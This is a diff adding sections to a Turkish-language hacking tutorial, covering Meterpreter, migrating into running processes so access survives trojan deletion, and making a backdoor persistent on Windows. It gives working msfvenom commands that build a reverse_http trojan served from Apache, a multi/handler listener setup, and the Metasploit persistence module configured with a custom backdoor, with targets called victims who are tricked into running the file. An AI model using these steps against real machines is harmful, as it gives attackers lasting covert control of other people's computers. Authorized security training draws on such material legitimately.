@@ -79,7 +79,10 @@
   - [Veil](#veil)
     - [Trojan Oluşturmak](#trojan-oluşturmak)
     - [Anti-Virüslere Yakalanmamak](#anti-virüslere-yakalanmamak)
+    - [Meterpreter Nedir](#meterpreter-nedir)
     - [Multi Handler Oluşturmak](#multi-handler-oluşturmak)
+    - [Servislere Enjekte Olmak](#servislere-enjekte-olmak)
+    - [Bağlantıları Kalıcı Hale Getirmek](#bağlantıları-kalıcı-hale-getirmek)
 - [Sosyal Mühendislik](#sosyal-mühendislik)
   - [Görseller ile Dosyayı Birleştirmek](#görseller-ile-dosyayı-birleştirmek)
   - [Uzantıları Değiştirmek](#uzantıları-değiştirmek)
@@ -917,10 +920,14 @@ Oluşturduğumuz Trojanlar'ın **option** seçeneklerini değiştirmek yakalanma
 
 ![Veil Generated Lucky](./assets/29-veil-generated.png)
 
+### Meterpreter Nedir
+Meterpreter, ileri düzey bir Metasploit payload tipidir. Dinamik olarak hedef bilgisayarda DLL Enjeksiyon mantığı ile çalışır. Ağda, sahneleyici payloadları ve soketleri kullanarak yerel bilgisayarla haberleşir. Komut geçmişi, komut tamamlama vb. kabiliyetleri bulunur. Hedef bilgisayarda çalışan çok etkili bir komut satırıdır.
+
 ### Multi Handler Oluşturmak
 Trojanımızı oluşturduk. Bir kullanıcıyı kandırdık ve bir şekilde trojanımızı kullanıcıya açtırdık. Bu aşamada açılan bağlantıyı kendi bilgisayarımızda dinlememiz gerek. Bunun için de `msfconsole` kullanacağız <br><br>
 Terminale `msfconsole` yazarak programı açabiliriz
 <br><br>
+
 `use exploit/multi/handler` komutu ile gelen bağlantıları dinlememizi sağlayacak olan exploiti çalıştırabiliriz<br><br>
 `set PAYLOAD windows/meterpreter/reverse_http` komutu ile **reverse_http** için oluşturduğumuz trojanı dinlemeye başlayabiliriz. <br><br>
 `show options` ile ilgili konfigürasyonları görebiliriz. 
@@ -934,6 +941,97 @@ set LHOST 192.168.1.87
 Ardından `exploit` diyerek exploiti çalıştırabiliriz. İlgili LHOST'da bir session (oturum/bağlantı isteği) oluşturulursa dinlemeye başlayacaktır.
 
 ![Multi Handler Exploit](./assets/31-multi-handler-exploit.png)
+
+### Servislere Enjekte Olmak
+Kurbanlarımıza karşı bağlantı sağladık peki kurbanlarımız mevzuyu çözer ve bizim gönderdiğimiz trojan dosyalarımızı silerlerse ne olur? Bağlantıyı ve erişimi kaybederiz. Bu sebeple bir bağlantı açıldığında kendimizi hedef makinada çalışan bir servise enjekte etmeliyiz. 
+- Bağlantı açıldığında `ps` komutu ile hedefin makinasında çalışan servislerin listesini görebiliriz.
+- `migrate <servis_id>` ile de kendimizi o servise enjekte ederiz. O servis ve hedef makina kapanmadığı sürece erişimimiz olacaktır. Fakat bundan hemen sonra bir alttaki başlığı da işlersek ömür boyu ücretsiz erişimimiz olacaktır :stuck_out_tongue_winking_eye:
+
+  - `ps` ile çalışan servisleri görmek
+
+![ps services list](./assets/65-migrate-ps.png) 
+
+  - `migrate <session_id>` ile servise enjekte olmak
+
+![migrate injection](./assets/66-migrate-injection.png)
+
+
+### Bağlantıları Kalıcı Hale Getirmek
+Hedef bilgisayarda her zaman erişimimiz olmasını istiyorsak trojanımızı bir servis olarak enjekte etmeliyiz. <br>
+- Öncelikle [msfvenom](#msfvenom)(isterseniz [Veil](#veil) kullanabilirsiniz tercih meselesi) kullanarak bir trojan oluşturuyorum.
+```
+# msfvenom -p windows/meterpreter/reverse_http -a x86 --platform windows lhost=192.168.1.87 lport=8080 -f exe -o /var/www/html/servis_trojan.exe
+>>> No encoder or badchars specified, outputting raw payload
+Payload size: 451 bytes
+Final size of exe file: 73802 bytes
+Saved as: /var/www/html/servis_trojan.exe
+```
+- `apache2` servisimi başlatıyorum
+```
+# systemctl start apache2
+```
+- Hedef bilgisayarımda Kali web sunucusuna bağlanıyorum ve trojanı çalıştırıyorum. Aynı zamanda Kali'de de [multi handler](#multi-handler-oluşturmak) oluşturuyorum ve bağlantıyı dinlemeye başlıyorum. Buraya kadar her şey zaten yaptığımız gibi.
+```
+# msfconsole
+
+msf5 > use exploit/multi/handler
+
+msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_http
+
+msf5 exploit(multi/handler) > set LHOST 192.168.1.87
+
+msf5 exploit(multi/handler) > set LPORT 8080
+
+msf5 exploit(multi/handler) > exploit
+
+msf5 exploit(multi/handler) > background # session'ı arka plana atar sessions -l diyerek mevcut sessions'ları görebiliriz
+```
+
+![msfconsole](./assets/62-msfconsole.png)
+
+- Dilersek `sessions -<session_id>` komutu ile ilgili session'a geçiş yapabiliriz
+
+![sessions -id](./assets/63-sessions-id.png)
+
+- `use exploit/windows/local/persistence` komutu ile yeni göreceğimiz handler'ı kullanıyoruz. Bu modül sayesinde kendi backdoor'umuzu hedef bilgisayara servis olarak enjekte edeceğiz. `show options` diyerek ilgili seçenekleri görebiliriz.
+
+```
+msf5 exploit(multi/handler) > use exploit/windows/local/persistence
+
+msf5 exploit(windows/local/persistence) > show options
+
+>>> Module options (exploit/windows/local/persistence):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DELAY     10               yes       Delay (in seconds) for persistent payload to keep reconnecting back.
+   EXE_NAME                   no        The filename for the payload to be used on the target host (%RAND%.exe by default).
+   PATH                       no        Path to write payload (%TEMP% by default).
+   REG_NAME                   no        The name to call registry value for persistence on target host (%RAND% by default).
+   SESSION                    yes       The session to run this module on.
+   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)
+   VBS_NAME                   no        The filename to use for the VBS persistent script on the target host (%RAND% by default).
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+```
+- Hacklediğimiz bilgisayar her açılıp kapandıktan sonra internete her bağlandığında **x saniye** sonra bizimle iletişime geçsin diyoruz. **DELAY** olarak gözüken parametre bu **x saniyeye** işaret etmektedir. DELAY kadar saniye geçtikten sonra enjekte ettiğimiz servis bize bağlanmaya çalışacak.
+- Açık olan session'u kullanarak backdoor'u enjekte edeceğiz. Yani **bir session'ın açık olması gerekmektedir**
+- **EXE_NAME** parametresi ise servis olarak enjekte ettiğimizde hedef makinada hangi isimde bir servis olarak çalışacağıdır. `set EXE_NAME denemeservisimiz.exe`
+- **SESSION** parametresi ise hangi session'a ait olacağıdır. Ne demiştik, bir session bulunmak zorundadır. Buraya parametre olarak ilgili session numarasını veriyoruz. `set SESSION 1` (benim hedef makinamın SESSION numarası 1)
+
+- Dilersek istediğimiz kendi oluşturduğumuz trojan'ı kullanabiliriz. `show advanced` ile biraz daha ileri seviye opsiyonları açabiliriz. 
+- **EXE::Custom** olarak gözüken parametre bizim belirlemek istediğimiz trojanı temsil eder. `set EXE::Custom /var/www/html/servis_trojan.exe` (benim trojanım burada olduğu için bu path'i verdim. Sizinki nerede ise onu vermeniz gerekmektedir. İsterseniz bu aşamayı pas geçebilirsiniz, msfconsole kendi backdoor'unu enjekte edecektir.)
+- Ardından `exploit` diyerek exploit'i çalıştırıyoruz ve hedef makinamıza backdoor'u bir servis olarak enjekte ediyor.
+
+- Tekrar bir [multi handler](#multi-handler-oluşturmak) oluşturuyoruz ve hedef makinamızı açıp kapatıyoruz bakalım bağlantıyı yakalayabilecek miyiz :)
+
+  - Windows yeniden başlatıyoruz
+![windows restart](./assets/64-windows-restart.png)
 
 # Sosyal Mühendislik
 ## Görseller ile Dosyayı Birleştirmek
@@ -1192,3 +1290,4 @@ Msfvenom'da [Veil](#veil)'a alternatif olabilecek bir backdoor oluşturma aracı
 
 ![ngrok msfconsole](./assets/61-ngrok-msfconsole.png)
 
+ 
